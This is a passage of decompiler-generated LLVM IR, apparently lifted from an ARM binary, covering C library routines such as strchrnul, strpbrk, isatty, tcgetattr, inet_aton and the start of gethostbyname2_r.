  uselistorder i32 %v1_f460, { 1, 0 }
  uselistorder i32 %v1_f43c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_f47c, { 1, 0 }
  uselistorder label %dec_label_pc_f45c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_f48c = urem i32 %arg1, 256
  %v0_f4ac2 = load i32, i32* @r0, align 4
  %v1_f4ac3 = urem i32 %v0_f4ac2, 4
  %v2_f4ac4 = icmp eq i32 %v1_f4ac3, 0
  br i1 %v2_f4ac4, label %dec_label_pc_f4b4, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %entry, %dec_label_pc_f4a8
  %v0_f4a8 = phi i32 [ %v1_f4a8, %dec_label_pc_f4a8 ], [ %v0_f4ac2, %entry ]
  %v1_f494 = inttoptr i32 %v0_f4a8 to i8*
  %v2_f494 = load i8, i8* %v1_f494, align 1
  %v3_f494 = zext i8 %v2_f494 to i32
  %v9_f498 = icmp eq i32 %v3_f494, %v1_f48c
  br i1 %v9_f498, label %dec_label_pc_f564, label %dec_label_pc_f4a0

dec_label_pc_f4a0:                                ; preds = %dec_label_pc_f494
  %v2_f4a0 = icmp eq i8 %v2_f494, 0
  br i1 %v2_f4a0, label %dec_label_pc_f564, label %dec_label_pc_f4a8

dec_label_pc_f4a8:                                ; preds = %dec_label_pc_f4a0
  %v1_f4a8 = add i32 %v0_f4a8, 1
  %v1_f4ac = urem i32 %v1_f4a8, 4
  %v2_f4ac = icmp eq i32 %v1_f4ac, 0
  br i1 %v2_f4ac, label %dec_label_pc_f4b4, label %dec_label_pc_f494

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f4a8, %entry
  %v0_f4b8 = phi i32 [ %v0_f4ac2, %entry ], [ %v1_f4a8, %dec_label_pc_f4a8 ]
  %v4_f4b4 = mul nuw nsw i32 %v1_f48c, 256
  %v5_f4b4 = or i32 %v4_f4b4, %v1_f48c
  %v4_f4bc = mul i32 %v5_f4b4, 65536
  %v5_f4bc = or i32 %v4_f4bc, %v5_f4b4
  br label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f55c, %dec_label_pc_f4fc, %dec_label_pc_f4b4
  %v0_f524 = phi i32 [ %v0_f4b8, %dec_label_pc_f4b4 ], [ %v4_f4c0, %dec_label_pc_f4fc ], [ %v4_f4c0, %dec_label_pc_f55c ]
  %v1_f4c0 = inttoptr i32 %v0_f524 to i32*
  %v2_f4c0 = load i32, i32* %v1_f4c0, align 4
  %v4_f4c0 = add i32 %v0_f524, 4
  %v2_f4c8 = xor i32 %v2_f4c0, %v5_f4bc
  %v2_f4cc = add i32 %v2_f4c8, 2130640639
  store i32 %v2_f4cc, i32* @ip, align 4
  %v2_f4d4 = add i32 %v2_f4c0, 2130640639
  %v1_f4d8 = sub i32 -1, %v2_f4c0
  %v2_f4dc = xor i32 %v2_f4d4, %v1_f4d8
  %v2_f4e8 = and i32 %v2_f4dc, -2130640640
  %v2_f4f0 = icmp eq i32 %v2_f4e8, 0
  br i1 %v2_f4f0, label %dec_label_pc_f4fc, label %dec_label_pc_f504

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f4c0
  %v1_f4e4 = sub i32 -1, %v2_f4c8
  %v2_f4ec = xor i32 %v2_f4cc, %v1_f4e4
  %v2_f4f4 = and i32 %v2_f4ec, -2130640640
  %v2_f4fc = icmp eq i32 %v2_f4f4, 0
  br i1 %v2_f4fc, label %dec_label_pc_f4c0, label %dec_label_pc_f504

dec_label_pc_f504:                                ; preds = %dec_label_pc_f4c0, %dec_label_pc_f4fc
  %v2_f504 = inttoptr i32 %v0_f524 to i8*
  %v3_f504 = load i8, i8* %v2_f504, align 1
  %v4_f504 = zext i8 %v3_f504 to i32
  %v9_f508 = icmp eq i32 %v4_f504, %v1_f48c
  br i1 %v9_f508, label %dec_label_pc_f564, label %dec_label_pc_f514

dec_label_pc_f514:                                ; preds = %dec_label_pc_f504
  %v2_f514 = icmp eq i8 %v3_f504, 0
  br i1 %v2_f514, label %dec_label_pc_f564, label %dec_label_pc_f51c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f514
  %v1_f51c = add i32 %v0_f524, 1
  %v2_f51c = inttoptr i32 %v1_f51c to i8*
  %v3_f51c = load i8, i8* %v2_f51c, align 1
  %v4_f51c = zext i8 %v3_f51c to i32
  %v9_f520 = icmp eq i32 %v4_f51c, %v1_f48c
  br i1 %v9_f520, label %dec_label_pc_f564, label %dec_label_pc_f52c

dec_label_pc_f52c:                                ; preds = %dec_label_pc_f51c
  %v2_f52c = icmp eq i8 %v3_f51c, 0
  br i1 %v2_f52c, label %dec_label_pc_f564, label %dec_label_pc_f534

dec_label_pc_f534:                                ; preds = %dec_label_pc_f52c
  %v1_f534 = add i32 %v0_f524, 2
  %v2_f534 = inttoptr i32 %v1_f534 to i8*
  %v3_f534 = load i8, i8* %v2_f534, align 1
  %v4_f534 = zext i8 %v3_f534 to i32
  %v9_f538 = icmp eq i32 %v4_f534, %v1_f48c
  br i1 %v9_f538, label %dec_label_pc_f564, label %dec_label_pc_f544

dec_label_pc_f544:                                ; preds = %dec_label_pc_f534
  %v2_f544 = icmp eq i8 %v3_f534, 0
  br i1 %v2_f544, label %dec_label_pc_f564, label %dec_label_pc_f54c

dec_label_pc_f54c:                                ; preds = %dec_label_pc_f544
  %v1_f54c = add i32 %v0_f524, 3
  %v2_f54c = inttoptr i32 %v1_f54c to i8*
  %v3_f54c = load i8, i8* %v2_f54c, align 1
  %v4_f54c = zext i8 %v3_f54c to i32
  %v9_f550 = icmp eq i32 %v4_f54c, %v1_f48c
  br i1 %v9_f550, label %dec_label_pc_f564, label %dec_label_pc_f55c

dec_label_pc_f55c:                                ; preds = %dec_label_pc_f54c
  %v2_f55c = icmp eq i8 %v3_f54c, 0
  br i1 %v2_f55c, label %dec_label_pc_f564, label %dec_label_pc_f4c0

dec_label_pc_f564:                                ; preds = %dec_label_pc_f4a0, %dec_label_pc_f494, %dec_label_pc_f55c, %dec_label_pc_f54c, %dec_label_pc_f544, %dec_label_pc_f534, %dec_label_pc_f52c, %dec_label_pc_f51c, %dec_label_pc_f514, %dec_label_pc_f504
  %v1_f568 = phi i32 [ %v1_f54c, %dec_label_pc_f55c ], [ %v1_f54c, %dec_label_pc_f54c ], [ %v1_f534, %dec_label_pc_f544 ], [ %v1_f534, %dec_label_pc_f534 ], [ %v1_f51c, %dec_label_pc_f52c ], [ %v1_f51c, %dec_label_pc_f51c ], [ %v0_f524, %dec_label_pc_f514 ], [ %v0_f524, %dec_label_pc_f504 ], [ %v0_f4a8, %dec_label_pc_f494 ], [ %v0_f4a8, %dec_label_pc_f4a0 ]
  ret i32 %v1_f568

; uselistorder directives
  uselistorder i32 %v4_f4c0, { 1, 0 }
  uselistorder i32 %v2_f4c0, { 0, 2, 1 }
  uselistorder i32 %v0_f524, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_f4b4, { 1, 0 }
  uselistorder i32 %v1_f4a8, { 1, 0, 2 }
  uselistorder i32 %v0_f4ac2, { 2, 1, 0 }
  uselistorder i32 %v1_f48c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_f564, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_f504, { 1, 0 }
  uselistorder label %dec_label_pc_f494, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f5a0

dec_label_pc_f57c:                                ; preds = %dec_label_pc_f58c
  %v3_f58c = zext i8 %v2_f58c to i32
  %v1_f594 = add i32 %v0_f594, 1
  %v1_f57c = load i32, i32* %r0.global-to-local, align 4
  %v9_f57c = icmp eq i32 %v3_f58c, %v1_f57c
  br i1 %v9_f57c, label %dec_label_pc_f584, label %dec_label_pc_f58c

dec_label_pc_f584:                                ; preds = %dec_label_pc_f57c
  %v0_f584 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f584, i32* %r0.global-to-local, align 4
  ret i32 %v0_f584

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f57c, %dec_label_pc_f5a0
  %v0_f594 = phi i32 [ %v1_f594, %dec_label_pc_f57c ], [ %arg2, %dec_label_pc_f5a0 ]
  %v1_f58c = inttoptr i32 %v0_f594 to i8*
  %v2_f58c = load i8, i8* %v1_f58c, align 1
  %v2_f590 = icmp eq i8 %v2_f58c, 0
  br i1 %v2_f590, label %dec_label_pc_f59c, label %dec_label_pc_f57c

dec_label_pc_f59c:                                ; preds = %dec_label_pc_f58c
  %v0_f59c = load i32, i32* %r2.global-to-local, align 4
  %v1_f59c = add i32 %v0_f59c, 1
  br label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %entry, %dec_label_pc_f59c
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_f59c, %dec_label_pc_f59c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_f5a0 = inttoptr i32 %storemerge to i8*
  %v2_f5a0 = load i8, i8* %v1_f5a0, align 1
  %v3_f5a0 = zext i8 %v2_f5a0 to i32
  store i32 %v3_f5a0, i32* %r0.global-to-local, align 4
  %v2_f5a4 = icmp eq i8 %v2_f5a0, 0
  %v0_f5a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f5a4, i32 %v0_f5a8)
  br label %dec_label_pc_f58c

; uselistorder directives
  uselistorder i32 %v0_f594, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_f5a0, { 1, 0 }
  uselistorder label %dec_label_pc_f58c, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_f5bc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_f5bc, i32* @r1, align 4
  %v0_f5c0 = call i32 @__GI_tcgetattr()
  %v1_f5c4 = sub i32 1, %v0_f5c0
  %v2_f5c4 = icmp ult i32 %v0_f5c0, 2
  br i1 %v2_f5c4, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_f5d4 = phi i32 [ %v1_f5c4, %entry ], [ 0, %bb ]
  ret i32 %v1_f5d4

; uselistorder directives
  uselistorder i32 %v0_f5c0, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_f5d8 = load i32, i32* @r4, align 4
  %v6_f5d8 = load i32, i32* @r5, align 4
  %v0_f5e4 = load i32, i32* @r1, align 4
  store i32 %v0_f5e4, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_f5f0 = call i32 @ioctl()
  store i32 %v0_f5f0, i32* %r0.global-to-local, align 4
  store i32 %v0_f5f0, i32* @r5, align 4
  %v2_f5f4 = icmp eq i32 %v0_f5f0, 0
  br i1 %v2_f5f4, label %dec_label_pc_f5fc, label %dec_label_pc_f640

dec_label_pc_f5fc:                                ; preds = %entry
  %v4_f608 = zext i8 %tmp to i32
  store i32 %v4_f608, i32* @ip, align 4
  %v3_f60c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f60c, i32* @r3, align 4
  %v1_f610 = load i32, i32* @r4, align 4
  %v2_f610 = add i32 %v1_f610, 4
  %v3_f610 = inttoptr i32 %v2_f610 to i32*
  %v0_f614 = load i32, i32* %r1.global-to-local, align 4
  %v1_f614 = load i32, i32* @r4, align 4
  %v2_f614 = add i32 %v1_f614, 8
  %v3_f614 = inttoptr i32 %v2_f614 to i32*
  store i32 %v0_f614, i32* %v3_f614, align 4
  %v0_f618 = load i32, i32* %r0.global-to-local, align 4
  %v1_f618 = load i32, i32* @r4, align 4
  %v2_f618 = add i32 %v1_f618, 12
  %v3_f618 = inttoptr i32 %v2_f618 to i32*
  store i32 %v0_f618, i32* %v3_f618, align 4
  %v2_f61c = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_f61c, i32* @r1, align 4
  %v1_f624 = load i32, i32* @r4, align 4
  %v2_f624 = inttoptr i32 %v1_f624 to i32*
  store i32 %v3_f60c, i32* %v2_f624, align 4
  %v0_f628 = load i32, i32* @ip, align 4
  %v1_f628 = trunc i32 %v0_f628 to i8
  %v2_f628 = load i32, i32* @r4, align 4
  %v3_f628 = add i32 %v2_f628, 16
  %v4_f628 = inttoptr i32 %v3_f628 to i8*
  store i8 %v1_f628, i8* %v4_f628, align 1
  %v0_f62c = load i32, i32* @r4, align 4
  %v1_f62c = add i32 %v0_f62c, 17
  store i32 %v1_f62c, i32* %r0.global-to-local, align 4
  %v4_f630 = call i32 @__GI_mempcpy(i32 %v1_f62c, i32 %v2_f61c, i32 19, i32 %v3_f60c)
  store i32 %v4_f630, i32* %r0.global-to-local, align 4
  %v0_f634 = load i32, i32* @r5, align 4
  store i32 %v0_f634, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_f63c = inttoptr i32 %v4_f630 to i8*
  %v3_f63c = call i32 @__GI_memset(i8* %v2_f63c, i32 %v0_f634)
  store i32 %v3_f63c, i32* %r0.global-to-local, align 4
  %v0_f640.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f640

dec_label_pc_f640:                                ; preds = %entry, %dec_label_pc_f5fc
  %v0_f640 = phi i32 [ %v0_f5f0, %entry ], [ %v0_f640.pre, %dec_label_pc_f5fc ]
  store i32 %v0_f640, i32* %r0.global-to-local, align 4
  store i32 %v3_f5d8, i32* @r4, align 4
  store i32 %v6_f5d8, i32* @r5, align 4
  ret i32 %v0_f640

; uselistorder directives
  uselistorder i32 %v0_f640, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_f640, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_f654 = load i32, i32* @r4, align 4
  store i32 %v3_f654, i32* %stack_var_-28, align 4
  %v0_f65c = load i32, i32* %r0.global-to-local, align 4
  %v2_f65c = icmp eq i32 %v0_f65c, 0
  br i1 %v2_f65c, label %dec_label_pc_f738, label %dec_label_pc_f66c

dec_label_pc_f66c:                                ; preds = %entry
  br label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f66c, %dec_label_pc_f6fc
  %v1_f6fc = phi i32 [ 0, %dec_label_pc_f66c ], [ %v5_f6fc, %dec_label_pc_f6fc ]
  %v0_f700 = phi i32 [ 1, %dec_label_pc_f66c ], [ %v1_f700, %dec_label_pc_f6fc ]
  %v0_f684 = phi i32 [ %v0_f65c, %dec_label_pc_f66c ], [ %v0_f68412, %dec_label_pc_f6fc ]
  %v1_f684 = inttoptr i32 %v0_f684 to i8*
  %v2_f684 = load i8, i8* %v1_f684, align 1
  %v3_f684 = zext i8 %v2_f684 to i32
  %v4_f688 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 140) to i32*), align 4
  %v2_f68c = mul nuw nsw i32 %v3_f684, 2
  %v2_f690 = add i32 %v2_f68c, %v4_f688
  %v3_f690 = inttoptr i32 %v2_f690 to i16*
  %v4_f690 = load i16, i16* %v3_f690, align 2
  %v1_f694 = and i16 %v4_f690, 8
  %v2_f694 = icmp eq i16 %v1_f694, 0
  br i1 %v2_f694, label %dec_label_pc_f738, label %dec_label_pc_f69c

dec_label_pc_f69c:                                ; preds = %dec_label_pc_f684
  br label %dec_label_pc_f6bc

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f6bc
  %v2_f6a4 = mul i32 %v0_f6fc, 10
  %v1_f6a8 = add i32 %v2_f6a4, -48
  %v2_f6ac = add i32 %v3_f6bc, %v1_f6a8
  %v8_f6b4 = icmp sgt i32 %v2_f6ac, 255
  br i1 %v8_f6b4, label %dec_label_pc_f738, label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6a4
  %v1_f6b8 = add i32 %v0_f6ec, 1
  store i32 %v1_f6b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f6bc

dec_label_pc_f6bc:                                ; preds = %dec_label_pc_f69c, %dec_label_pc_f6b8
  %v0_f6fc = phi i32 [ 0, %dec_label_pc_f69c ], [ %v2_f6ac, %dec_label_pc_f6b8 ]
  %v0_f6ec = phi i32 [ %v0_f684, %dec_label_pc_f69c ], [ %v1_f6b8, %dec_label_pc_f6b8 ]
  %v1_f6bc = inttoptr i32 %v0_f6ec to i8*
  %v2_f6bc = load i8, i8* %v1_f6bc, align 1
  %v3_f6bc = zext i8 %v2_f6bc to i32
  %v2_f6c0 = mul nuw nsw i32 %v3_f6bc, 2
  %v2_f6c4 = add i32 %v2_f6c0, %v4_f688
  %v3_f6c4 = inttoptr i32 %v2_f6c4 to i16*
  %v4_f6c4 = load i16, i16* %v3_f6c4, align 2
  %v6_f6c4 = zext i16 %v4_f6c4 to i32
  %v1_f6c8 = and i32 %v6_f6c4, 8
  %v2_f6c8 = icmp eq i32 %v1_f6c8, 0
  br i1 %v2_f6c8, label %dec_label_pc_f6d0, label %dec_label_pc_f6a4

dec_label_pc_f6d0:                                ; preds = %dec_label_pc_f6bc
  %v7_f6d0 = icmp eq i32 %v0_f700, 4
  br i1 %v7_f6d0, label %dec_label_pc_f6e8, label %dec_label_pc_f6d8

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f6d0
  %v7_f6d8 = icmp eq i8 %v2_f6bc, 46
  br i1 %v7_f6d8, label %dec_label_pc_f6e0, label %dec_label_pc_f738

dec_label_pc_f6e0:                                ; preds = %dec_label_pc_f6d8
  %v1_f6e0 = add i32 %v0_f6ec, 1
  store i32 %v1_f6e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f6fc

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6d0
  %v2_f6e8 = icmp eq i8 %v2_f6bc, 0
  %v1_f6ec = add i32 %v0_f6ec, 1
  store i32 %v1_f6ec, i32* %r0.global-to-local, align 4
  br i1 %v2_f6e8, label %dec_label_pc_f6fc, label %dec_label_pc_f6f4

dec_label_pc_f6f4:                                ; preds = %dec_label_pc_f6e8
  %v1_f6f4 = and i32 %v6_f6c4, 32
  %v2_f6f4 = icmp eq i32 %v1_f6f4, 0
  br i1 %v2_f6f4, label %dec_label_pc_f738, label %dec_label_pc_f6fc

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6f4, %dec_label_pc_f6e8, %dec_label_pc_f6e0
  %v0_f68412 = phi i32 [ %v1_f6ec, %dec_label_pc_f6f4 ], [ %v1_f6ec, %dec_label_pc_f6e8 ], [ %v1_f6e0, %dec_label_pc_f6e0 ]
  %v4_f6fc = mul i32 %v1_f6fc, 256
  %v5_f6fc = or i32 %v0_f6fc, %v4_f6fc
  %v1_f700 = add nuw nsw i32 %v0_f700, 1
  %v7_f708 = icmp slt i32 %v1_f700, 5
  br i1 %v7_f708, label %dec_label_pc_f684, label %dec_label_pc_f70c

dec_label_pc_f70c:                                ; preds = %dec_label_pc_f6fc
  %v2_f70c = icmp eq i32 %arg2, 0
  br i1 %v2_f70c, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_f70c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f73c

bb:                                               ; preds = %dec_label_pc_f70c
  %v4_f710 = udiv i32 %v5_f6fc, 16777216
  %v2_f714 = udiv i32 %v5_f6fc, 256
  %v5_f718 = and i32 %v2_f714, 65280
  %v2_f71c = and i32 %v5_f6fc, ptrtoint (i32* @global_var_ff00.235 to i32)
  %v5_f720 = mul i32 %v2_f71c, 256
  %v5_f724 = mul i32 %v0_f6fc, 16777216
  %v6_f718 = or i32 %v4_f710, %v5_f724
  %v6_f720 = or i32 %v6_f718, %v5_f718
  %v6_f724 = or i32 %v6_f720, %v5_f720
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_f730 = inttoptr i32 %arg2 to i32*
  store i32 %v6_f724, i32* %v3_f730, align 4
  %v2_f73c.pre = load i32, i32* %stack_var_-28, align 4
  %v1_f740.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f73c

dec_label_pc_f738:                                ; preds = %dec_label_pc_f6d8, %dec_label_pc_f6f4, %dec_label_pc_f684, %dec_label_pc_f6a4, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f73c

dec_label_pc_f73c:                                ; preds = %.thread7.thread, %bb, %dec_label_pc_f738
  %v1_f740 = phi i32 [ %v1_f740.pre, %bb ], [ 0, %dec_label_pc_f738 ], [ 1, %.thread7.thread ]
  %v2_f73c = phi i32 [ %v2_f73c.pre, %bb ], [ %v3_f654, %dec_label_pc_f738 ], [ %v3_f654, %.thread7.thread ]
  store i32 %v2_f73c, i32* @r4, align 4
  ret i32 %v1_f740

; uselistorder directives
  uselistorder i32 %v1_f700, { 1, 0 }
  uselistorder i32 %v5_f6fc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_f6ec, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_f73c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f738, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_f6bc, { 1, 0 }
  uselistorder label %dec_label_pc_f684, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_f74c = load i32, i32* @r6, align 4
  %v12_f74c = load i32, i32* @r7, align 4
  %v24_f74c = load i32, i32* @fp, align 4
  %v7_f750 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_f750, label %dec_label_pc_f774, label %dec_label_pc_f794

dec_label_pc_f774:                                ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_f78c = call i32 @gethostbyname_r()
  store i32 %v0_f78c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f794:                                ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_f79c = icmp eq i32 %arg2, 10
  %v2_f7a0 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_f7a0, align 4
  br i1 %v7_f79c, label %dec_label_pc_f7a8, label %dec_label_pc_f9dc

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f794
  %v1_f7a8 = load i32, i32* @r7, align 4
  %v9_f7a8 = icmp eq i32 %v1_f7a8, %arg1
  br i1 %v9_f7a8, label %dec_label_pc_f9dc, label %dec_label_pc_f7b0

dec_label_pc_f7b0:                                ; preds = %dec_label_pc_f7a8
  %v0_f7b0 = call i32 @__GI___errno_location()
  store i32 %v0_f7b0, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_f7b0, i32* @r5, align 4
  %v0_f7bc = load i32, i32* @r4, align 4
  %v0_f7c0 = load i32, i32* @r6, align 4
  store i32 %v0_f7c0, i32* %r2.global-to-local, align 4
  %v1_f7c4 = inttoptr i32 %v0_f7b0 to i32*
  %v2_f7c4 = load i32, i32* %v1_f7c4, align 4
  store i32 %v2_f7c4, i32* @r4, align 4
  %v0_f7c8 = load i32, i32* @r8, align 4
  store i32 %v0_f7c8, i32* %r3.global-to-local, align 4
  %v0_f7cc = load i32, i32* @r7, align 4
  store i32 %v0_f7cc, i32* %v1_f7c4, align 4
  %v0_f7d0 = load i32, i32* @sb, align 4
  store i32 %v0_f7d0, i32* %r0.global-to-local, align 4
  %v2_f7d4 = load i32, i32* @sl, align 4
  %v5_f7d4 = load i32, i32* %ip.global-to-local, align 4
  %v0_f7d8 = load i32, i32* @fp, align 4
  %v7_f7dc = call i32 @__get_hosts_byname_r(i32 %v0_f7d0, i32 %v0_f7bc, i32 %v0_f7c0, i32 %v0_f7c8, i32 %v2_f7d4, i32 %v5_f7d4, i32 %v0_f7d8)
  store i32 %v7_f7dc, i32* %r0.global-to-local, align 4
  %v2_f7e0 = icmp eq i32 %v7_f7dc, 0
  br i1 %v2_f7e0, label %bb, label %dec_label_pc_f7ec

bb:                                               ; preds = %dec_label_pc_f7b0
  %v1_f7e4 = load i32, i32* @r4, align 4
  %v2_f7e4 = load i32, i32* @r5, align 4
  %v3_f7e4 = inttoptr i32 %v2_f7e4 to i32*
  store i32 %v1_f7e4, i32* %v3_f7e4, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7b0
  %v0_f7ec = load i32, i32* @fp, align 4
  %v1_f7ec = inttoptr i32 %v0_f7ec to i32*
  %v2_f7ec = load i32, i32* %v1_f7ec, align 4
  store i32 %v2_f7ec, i32* %r3.global-to-local, align 4
  %v7_f7f0 = icmp eq i32 %v2_f7ec, 1
  br i1 %v7_f7f0, label %dec_label_pc_f80c, label %dec_label_pc_f7f8

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f7ec
  %v7_f7f8 = icmp eq i32 %v2_f7ec, 4
  br i1 %v7_f7f8, label %dec_label_pc_f828, label %dec_label_pc_f800

dec_label_pc_f800:                                ; preds = %dec_label_pc_f7f8
  %v3_f800 = icmp eq i32 %v2_f7ec, -1
  br i1 %v3_f800, label %dec_label_pc_f81c, label %dec_label_pc_f9e0

dec_label_pc_f80c:                                ; preds = %dec_label_pc_f7ec
  %v7_f80c = icmp eq i32 %v7_f7dc, 2
  br i1 %v7_f80c, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_f80c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_f82c

.thread1:                                         ; preds = %dec_label_pc_f80c
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_f82c

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f800
  %v0_f81c = load i32, i32* @r5, align 4
  %v1_f81c = inttoptr i32 %v0_f81c to i32*
  %v2_f81c = load i32, i32* %v1_f81c, align 4
  store i32 %v2_f81c, i32* %r3.global-to-local, align 4
  %v7_f820 = icmp eq i32 %v2_f81c, 2
  br i1 %v7_f820, label %dec_label_pc_f828, label %dec_label_pc_f9e0

dec_label_pc_f828:                                ; preds = %dec_label_pc_f81c, %dec_label_pc_f7f8
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_f82c

dec_label_pc_f82c:                                ; preds = %bb29, %.thread1, %dec_label_pc_f828
  %v0_f82c = load i32, i32* @r8, align 4
  %v1_f82c = sub i32 0, %v0_f82c
  %v1_f830 = urem i32 %v1_f82c, 4
  store i32 %v1_f830, i32* %r0.global-to-local, align 4
  %v1_f834 = load i32, i32* @sl, align 4
  %v2_f834 = sub i32 %v1_f834, %v1_f830
  %v1_f838 = add i32 %v2_f834, -24
  store i32 %v1_f838, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_f844 = load i32, i32* @r4, align 4
  %v1_f844 = load i32, i32* @r5, align 4
  %v2_f844 = inttoptr i32 %v1_f844 to i32*
  store i32 %v0_f844, i32* %v2_f844, align 4
  %v7_f848 = icmp sgt i32 %v1_f838, 255
  br i1 %v7_f848, label %dec_label_pc_f854, label %bb30

bb30:                                             ; preds = %dec_label_pc_f82c
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_f84c = load i32, i32* %r3.global-to-local, align 4
  %v1_f84c = load i32, i32* @fp, align 4
  %v2_f84c = inttoptr i32 %v1_f84c to i32*
  store i32 %v0_f84c, i32* %v2_f84c, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f854:                                ; preds = %dec_label_pc_f82c
  %v0_f84c3 = load i32, i32* %r3.global-to-local, align 4
  %v1_f84c4 = load i32, i32* @fp, align 4
  %v2_f84c5 = inttoptr i32 %v1_f84c4 to i32*
  store i32 %v0_f84c3, i32* %v2_f84c5, align 4
